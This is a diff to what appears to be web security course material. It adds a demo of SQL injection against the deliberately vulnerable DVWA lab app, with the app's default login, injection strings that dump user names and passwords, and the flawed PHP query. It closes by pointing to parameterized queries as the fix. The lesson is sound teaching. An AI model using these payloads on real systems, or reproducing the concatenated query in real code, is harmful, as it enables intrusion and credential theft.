@@ -171,9 +171,43 @@ Attacker inserts malicious code into a website link or server that uses database
 
 Software developers must defend against this by validating user input and sanitizing data.
 
-### Demo: How to Scam Users 101
+~/focusContent.demo
+
+### Demo: SQL Injection Attach
+
+We can use test applications like [Damn Vulnerable Web Application](https://github.com/digininja/DVWA) to test our hacking skills.
+
+Let's do a SQL Injection attack.
+
+_Prep_
+
+- Run the program in Docker: `docker run --rm -it -p 80:80 vulnerables/web-dvwa`
+- Navigate to localhost on port 80
+- Login with creds "admin/password"
+- Create the database
+- Go to the SQL Injection tab
+
+_Attack_
+
+- Enter `1` into the box for a normal query
+- Enter `1' OR 1=1-- -` to get all users
+- Enter `1' UNION SELECT user, password FROM users-- -` to get all users and passwords!
+
+Why does this work? Bad coding:
+
+[Bad Query](https://github.com/digininja/DVWA/blob/master/vulnerabilities/sqli/source/low.php)
+
+```php
+$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+```
+
+Dev should have used parameterized query.
+
+/~
 
 ~.focusContent.exercise
+
+### Exercise: How to Scam Users 101
 
 <figure>
     <span>
